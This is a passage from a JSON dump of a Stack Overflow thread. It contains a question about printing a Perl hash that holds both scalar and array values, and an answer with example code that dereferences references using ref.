"comment_id": 63162375, "body": "@Gaurav Sharma . What  is the file.pl contain . How could come scalar and array tell me briefly"}, {"owner": {"reputation": 1671, "user_id": 4600983, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/37d236a59e7d7e6871716bc25752dae6?s=128&d=identicon&r=PG&f=1", "display_name": "svsd", "link": "https://stackoverflow.com/users/4600983/svsd"}, "edited": false, "score": 0, "creation_date": 1466144315, "post_id": 37850317, "comment_id": 63204514, "body": "Is your goal to print the values for debugging? Is there a specific format you want the output to be in?"}], "answers": [{"comments": [{"owner": {"reputation": 6068, "user_id": 1799189, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/s4Pcu.jpg?s=128&g=1", "display_name": "xxfelixxx", "link": "https://stackoverflow.com/users/1799189/xxfelixxx"}, "reply_to_user": {"reputation": 11, "user_id": 6472779, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/--IWEf4U8_u0/AAAAAAAAAAI/AAAAAAAAAFg/yv5_HR09i_0/photo.jpg?sz=128", "display_name": "Gaurav Sharma", "link": "https://stackoverflow.com/users/6472779/gaurav-sharma"}, "edited": false, "score": 0, "creation_date": 1466152915, "post_id": 37851869, "comment_id": 63209117, "body": "you are welcome.  keep asking questions, we are here to help."}], "tags": [], "owner": {"reputation": 6068, "user_id": 1799189, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/s4Pcu.jpg?s=128&g=1", "display_name": "xxfelixxx", "link": "https://stackoverflow.com/users/1799189/xxfelixxx"}, "is_accepted": false, "score": 5, "last_activity_date": 1466060067, "creation_date": 1466060067, "answer_id": 37851869, "question_id": 37850317, "link": "https://stackoverflow.com/questions/37850317/perl-program-issue-how-to-print-scalar-and-array-values-together-of-hash/37851869#37851869", "title": "Perl Program Issue, how to print scalar and array values together of hash", "body": "<p>Non-scalar values require dereferencing, otherwise you will just print out <code>ARRAY(0xdeadbeef)</code> or <code>HASH(0xdeadbeef)</code> with the memory addresses of those data structures.</p>\n\n<p>Have a good read of Perl Data Structure Cookbook: <a href=\"http://perldoc.perl.org/perldsc.html\" rel=\"noreferrer\">perldoc perldsc</a>\nas well as Perl References: <a href=\"http://perldoc.perl.org/perlref.html\" rel=\"noreferrer\">perldoc perlref</a></p>\n\n<p>Since you did not provide your data, here is an example:</p>\n\n<pre><code>#!/usr/bin/env perl\n\nuse warnings;\nuse strict;\n\nmy %hash = ( foo =&gt; 'bar',\n             baz =&gt; [ 1, 2, 3 ],\n             qux =&gt; { a =&gt; 123, b =&gt; 234 }\n);\n\nwhile (my ($key, $val) = each %hash) {\n    my $ref_type = ref $val;\n    if ( not $ref_type ) {\n        # SCALAR VARIABLE\n        print \"$key =&gt; $val\\n\";\n        next;\n    }\n\n    if ('ARRAY' eq $ref_type) {\n        print \"$key =&gt; [ \" . join(',', @$val) . \" ]\\n\";\n    } elsif ('HASH' eq $ref_type) {\n        print \"$key =&gt; {\\n\";\n        while (my ($k, $v) = each %$val) {\n            print \"    $k =&gt; $v\\n\";\n        }\n        print \"}\\n\";\n    } else {\n        # Otherstuff...\n        die \"Don't know how to handle data of type '$ref_type'\";\n    }\n }\n</code></pre>\n\n<p><strong>Output</strong></p>\n\n<pre><code>baz =&gt; [ 1,2,3 ]\nqux =&gt; {\n    a =&gt; 123\n    b =&gt; 234\n}\nfoo =&gt; bar\n</code></pre>\n\n<p>For more complicated structures, you will need to recurse. </p>\n\n<p><code>Data::Printer</code> is useful for dumping out complicated structures.</p>\n"}], "owner": {"reputation": 11, "user_id": 6472779, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/--IWEf4U8_u0/AAAAAAAAAAI/AAAAAAAAAFg/yv5_HR09i_0/photo.jpg?sz=128", "display_name": "Gaurav Sharma", "link": "https://stackoverflow.com/users/6472779/gaurav-sharma"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 623, "favorite_count": 2, "answer_count": 1, "score": 1, "last_activity_date": 1466060067, "creation_date": 1466053753, "last_edit_date": 1495535645, "question_id": 37850317, "link": "https://stackoverflow.com/questions/37850317/perl-program-issue-how-to-print-scalar-and-array-values-together-of-hash", "title": "Perl Program Issue, how to print scalar and array values together of hash", "body": "<p>I also faced the same issue and I used <a href=\"https://stackoverflow.com/questions/11844679/extraction-and-printing-of-key-value-pair-from-a-text-file-using-perl/11844903?newreg=e80a512a0c1e4ae4a05c227815827c5d\">this solution</a>. It helped a lot, but it is useful when all values are scalar but my program contains both array and scalar values. so I am able to print scalar values but unable to print array values. Please suggest what we need to add?</p>\n\n<p>Code:</p>\n\n<pre><code>#!/grid/common/bin/perl \n\nuse warnings; \n\nrequire (\"file.pl\"); \n\nwhile (my ($key, $val) = each %hash) \n{ \n     print \"$key =&gt; $val\\n\"; \n}\n</code></pre>\n"}]